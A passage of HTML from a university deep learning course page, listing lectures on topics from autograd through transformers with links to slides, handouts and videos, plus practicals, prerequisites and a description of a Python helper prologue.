      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-1-DAG-networks.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-1-DAG-networks.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>4.2.</td><td>Autograd. (20 slides, 22min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-2-autograd.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-2-autograd.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-2-autograd.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-2-autograd.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>4.3.</td><td>PyTorch modules and batch processing. (15 slides, 15min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-3-modules-and-batch-processing.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-3-modules-and-batch-processing.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-3-modules-and-batch-processing.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-3-modules-and-batch-processing.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>4.4.</td><td>Convolutions. (23 slides, 23min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-4-convolutions.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-4-convolutions.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-4-convolutions.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-4-convolutions.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>4.5.</td><td>Pooling. (7 slides, 5min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-5-pooling.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-5-pooling.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-5-pooling.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-5-pooling.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>4.6.</td><td>Writing a PyTorch module. (10 slides, 10min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-4-6-writing-a-module.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-4-6-writing-a-module.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-4-6-writing-a-module.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-4-6-writing-a-module.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-5"></a>5. Initialization and optimization. (81 slides, 1h42min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-5.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>5.1.</td><td>Cross-entropy loss. (9 slides, 17min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-1-cross-entropy-loss.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-1-cross-entropy-loss.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-1-cross-entropy-loss.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-1-cross-entropy-loss.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.2.</td><td>Stochastic gradient descent. (17 slides, 26min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-2-SGD.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-2-SGD.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-2-SGD.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-2-SGD.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.3.</td><td>PyTorch optimizers. (8 slides, 6min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-3-optim.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-3-optim.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-3-optim.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-3-optim.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.4.</td><td>L<sub><small>2</small></sub> and L<sub><small>1</small></sub> penalties. (11 slides, 13min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-4-l2-l1-penalties.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-4-l2-l1-penalties.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-4-l2-l1-penalties.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-4-l2-l1-penalties.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.5.</td><td>Parameter initialization. (20 slides, 19min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-5-initialization.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-5-initialization.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-5-initialization.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-5-initialization.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.6.</td><td>Architecture choice and training protocol. (9 slides, 13min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-6-architecture-and-training.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-6-architecture-and-training.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-6-architecture-and-training.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-6-architecture-and-training.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>5.7.</td><td>Writing an autograd function. (7 slides, 8min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-5-7-writing-an-autograd-function.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-5-7-writing-an-autograd-function.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-5-7-writing-an-autograd-function.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-5-7-writing-an-autograd-function.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-6"></a>6. Going deeper. (86 slides, 1h39min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-6.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>6.1.</td><td>Benefits of depth. (12 slides, 24min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-1-benefits-of-depth.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-1-benefits-of-depth.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-1-benefits-of-depth.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-1-benefits-of-depth.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>6.2.</td><td>Rectifiers. (7 slides, 4min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-2-rectifiers.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-2-rectifiers.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-2-rectifiers.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-2-rectifiers.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>6.3.</td><td>Dropout. (11 slides, 13min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-3-dropout.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-3-dropout.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-3-dropout.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-3-dropout.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>6.4.</td><td>Batch normalization. (16 slides, 19min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-4-batch-normalization.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-4-batch-normalization.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-4-batch-normalization.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-4-batch-normalization.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>6.5.</td><td>Residual networks. (21 slides, 22min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-5-residual-networks.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-5-residual-networks.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-5-residual-networks.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-5-residual-networks.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>6.6.</td><td>Using GPUs. (19 slides, 18min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-6-6-using-GPUs.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-6-6-using-GPUs.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-6-6-using-GPUs.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-6-6-using-GPUs.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-7"></a>7. Autoencoders. (93 slides, 1h22min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-7.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>7.1.</td><td>Transposed convolutions. (14 slides, 14min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-7-1-transposed-convolutions.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-7-1-transposed-convolutions.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-7-1-transposed-convolutions.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-7-1-transposed-convolutions.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>7.2.</td><td>Deep Autoencoders. (26 slides, 16min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-7-2-autoencoders.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-7-2-autoencoders.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-7-2-autoencoders.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-7-2-autoencoders.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>7.3.</td><td>Denoising autoencoders. (38 slides, 33min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-7-3-denoising-autoencoders.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-7-3-denoising-autoencoders.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-7-3-denoising-autoencoders.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-7-3-denoising-autoencoders.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>7.4.</td><td>Variational autoencoders. (15 slides, 19min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-7-4-VAE.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-7-4-VAE.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-7-4-VAE.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-7-4-VAE.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-8"></a>8. Computer vision. (88 slides, 1h49min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-8.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>8.1.</td><td>Computer vision tasks. (14 slides, 20min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-8-1-CV-tasks.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-8-1-CV-tasks.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-8-1-CV-tasks.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-8-1-CV-tasks.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>8.2.</td><td>Networks for image classification. (36 slides, 44min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-8-2-image-classification.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-8-2-image-classification.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-8-2-image-classification.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-8-2-image-classification.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>8.3.</td><td>Networks for object detection. (15 slides, 21min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-8-3-object-detection.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-8-3-object-detection.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-8-3-object-detection.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-8-3-object-detection.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>8.4.</td><td>Networks for semantic segmentation. (10 slides, 11min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-8-4-segmentation.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-8-4-segmentation.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-8-4-segmentation.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-8-4-segmentation.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>8.5.</td><td>DataLoader and neuro-surgery. (13 slides, 13min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-8-5-dataloader-and-surgery.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-8-5-dataloader-and-surgery.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-8-5-dataloader-and-surgery.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-8-5-dataloader-and-surgery.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-9"></a>9. Under the hood. (92 slides, 1h22min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-9.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>9.1.</td><td>Looking at parameters. (13 slides, 10min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-9-1-looking-at-parameters.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-9-1-looking-at-parameters.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-9-1-looking-at-parameters.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-9-1-looking-at-parameters.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>9.2.</td><td>Looking at activations. (20 slides, 23min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-9-2-looking-at-activations.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-9-2-looking-at-activations.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-9-2-looking-at-activations.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-9-2-looking-at-activations.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>9.3.</td><td>Visualizing the processing in the input. (34 slides, 23min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-9-3-visualizing-in-input.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-9-3-visualizing-in-input.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-9-3-visualizing-in-input.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-9-3-visualizing-in-input.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>9.4.</td><td>Optimizing inputs. (25 slides, 25min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-9-4-optimizing-inputs.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-9-4-optimizing-inputs.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-9-4-optimizing-inputs.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-9-4-optimizing-inputs.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-10"></a>10. Autoregression and Normalizing Flows. (84 slides, 1h27min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-10.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>10.1.</td><td>Auto-regression. (25 slides, 28min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-10-1-autoregression.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-10-1-autoregression.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-10-1-autoregression.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-10-1-autoregression.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>10.2.</td><td>Causal convolutions. (25 slides, 22min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-10-2-causal-convolutions.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-10-2-causal-convolutions.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-10-2-causal-convolutions.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-10-2-causal-convolutions.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>10.3.</td><td>Non-volume preserving networks. (34 slides, 37min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-10-3-NVP.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-10-3-NVP.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-10-3-NVP.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-10-3-NVP.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-11"></a>11. Generative Adversarial Networks. (91 slides, 1h22min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-11.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>11.1.</td><td>Generative Adversarial Networks. (33 slides, 30min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-11-1-GAN.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-11-1-GAN.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-11-1-GAN.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-11-1-GAN.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>11.2.</td><td>Wasserstein GAN. (20 slides, 24min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-11-2-Wasserstein-GAN.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-11-2-Wasserstein-GAN.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-11-2-Wasserstein-GAN.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-11-2-Wasserstein-GAN.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>11.3.</td><td>Conditional GAN and image translation. (29 slides, 20min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-11-3-conditional-GAN.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-11-3-conditional-GAN.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-11-3-conditional-GAN.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-11-3-conditional-GAN.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>11.4.</td><td>Model persistence and checkpoints. (9 slides, 8min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-11-4-persistence.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-11-4-persistence.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-11-4-persistence.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-11-4-persistence.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-12"></a>12. Recurrent models and NLP. (73 slides, 1h18min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-12.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>12.1.</td><td>Recurrent Neural Networks. (24 slides, 23min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-12-1-RNN-basics.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-12-1-RNN-basics.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-12-1-RNN-basics.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-12-1-RNN-basics.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>12.2.</td><td>LSTM and GRU. (17 slides, 14min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-12-2-LSTM-and-GRU.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-12-2-LSTM-and-GRU.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-12-2-LSTM-and-GRU.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-12-2-LSTM-and-GRU.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>12.3.</td><td>Word embeddings and translation. (32 slides, 41min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-12-3-word-embeddings-and-translation.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-12-3-word-embeddings-and-translation.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-12-3-word-embeddings-and-translation.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-12-3-word-embeddings-and-translation.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>

  <li><a id="lecture-13"></a>13. Attention models. (the screencasts are not up-to-date, check the slides! – 93 slides, 1h25min videos)
  <img src="https://fleuret.org/dlc/pics/thumb-13.png" alt="Icon made from one of the slides">
    <table>
    <tbody><tr>
      <td>13.1.</td><td>Attention for Memory and Sequence Translation. (21 slides, 21min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-13-1-attention-memory-translation.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-13-1-attention-memory-translation.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-13-1-attention-memory-translation.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-13-1-attention-memory-translation.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>13.2.</td><td>Attention Mechanisms. (30 slides, 30min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-13-2-attention-mechanisms.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-13-2-attention-mechanisms.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-13-2-attention-mechanisms.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-13-2-attention-mechanisms.mp4">mp4</a>).</td>
    </tr>
    <tr>
      <td>13.3.</td><td>Transformer Networks. (42 slides, 34min video)</td>
    </tr>
    <tr>
      <td></td>
      <td><a href="https://fleuret.org/dlc/materials/dlc-handout-13-3-transformers.pdf">handout</a>
      (<a href="https://fleuret.org/dlc/materials/dlc-slides-13-3-transformers.pdf">slides</a>),
      <a href="https://fleuret.org/dlc/streaming/dlc-video-13-3-transformers.mp4">stream</a>
      (<a href="https://fleuret.org/dlc/videos/dlc-video-13-3-transformers.mp4">mp4</a>).</td>
    </tr>
    </tbody></table>
  </li>


</ul>

<h2><a id="practicals"></a>Practicals</h2>

<ul>
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-1.pdf">Practical 1</a></li>
<!-- <li><a href="materials/dlc-practical-1.pdf">Practical 1</a> (<a href="src/dlc_practical_1_solution.py">solution</a>)</li> -->
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-2.pdf">Practical 2</a></li>
<!-- <li><a href="materials/dlc-practical-2.pdf">Practical 2</a> (<a href="src/dlc_practical_2_solution.py">solution</a>)</li> -->
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-3.pdf">Practical 3</a></li>
<!-- <li><a href="materials/dlc-practical-3.pdf">Practical 3</a> (<a href="src/dlc_practical_3_solution.py">solution</a>)</li> -->
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-4.pdf">Practical 4</a></li>
<!-- <li><a href="materials/dlc-practical-4.pdf">Practical 4</a> (<a href="src/dlc_practical_4_solution.py">solution</a>)</li> -->
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-5.pdf">Practical 5</a></li>
<!-- <li><a href="materials/dlc-practical-5.pdf">Practical 5</a> (<a href="src/dlc_practical_5_solution.py">solution</a>)</li> -->
<li><a href="https://fleuret.org/dlc/materials/dlc-practical-6.pdf">Practical 6</a></li>
<!-- <li><a href="materials/dlc-practical-6.pdf">Practical 6</a> (<a href="src/dlc_practical_6_solution.py">solution</a>)</li> -->
</ul>

<!-- ************************************************************ -->
<!-- ************************************************************ -->
<!-- ************************************************************ -->

<h2><a id="information"></a>Information</h2>

<h2>Pre-requisites</h2>

<ul>
<li>Linear algebra (vectors, matrices, Euclidean spaces),</li>
<li>differential calculus (Jacobian, Hessian, chain rule),</li>
<li>Python programming,</li>
<li>basics in probabilities and statistics (discrete and continuous
distributions, law of large numbers, conditional probabilities,
Bayes, PCA),</li>
<li>basics in optimization (notion of minima, gradient descent),</li>
<li>basics in algorithmic (computational costs),</li>
<li>basics in signal processing (Fourier transform, wavelets).</li>
</ul>

<h2>Documentation</h2>

<p>You may have to look at the Python, Jupyter notebook, and PyTorch
documentations at</p>

<ul>
<li><a href="https://docs.python.org/">https://docs.python.org/</a></li>
<li><a href="https://jupyter.org/">https://jupyter.org/</a></li>
<li><a href="https://pytorch.org/docs/">https://pytorch.org/docs/</a></li>
</ul>

<!-- ************************************************************ -->

<h2><a id="prologue"></a>Practical session prologue</h2>

<p>Helper Python prologue for the practical
sessions: <a href="https://fleuret.org/dlc/src/dlc_practical_prologue.py">dlc_practical_prologue.py</a></p>

<h3>Argument parsing</h3>

<p>This prologue parses command-line arguments as follows</p>

<pre>usage: dummy.py [-h] [--full] [--tiny] [--seed SEED]
[--cifar] [--data_dir DATA_DIR]

DLC prologue file for practical sessions.

optional arguments:
-h, --help           show this help message and exit
--full               Use the full set, can take ages (default
False)
--tiny               Use a very small set for quick checks
(default False)
--seed SEED          Random seed (default 0, &lt; 0 is no seeding)
--cifar              Use the CIFAR data-set and not MNIST
(default False)
--data_dir DATA_DIR  Where are the PyTorch data located (default
$PYTORCH_DATA_DIR or './data')
</pre>

<h3>Loading data</h3>

<p>The prologue provides the function</p>

<pre>load_data(cifar = None, one_hot_labels = False, normalize = False, flatten = True)
</pre>

<p>which downloads the data when required, reshapes the images to 1d
vectors if <span>flatten</span>
is <span>True</span>, and narrows to a small subset of
samples if <span>--full</span> is not selected.</p>

<p>It returns a tuple of four tensors: <span>train_data</span>,
<span>train_target</span>, <span>test_data</span>, and <span>test_target</span>.</p>

<p>If <span>cifar</span> is <span>True</span>, the data-base used is CIFAR10, if it
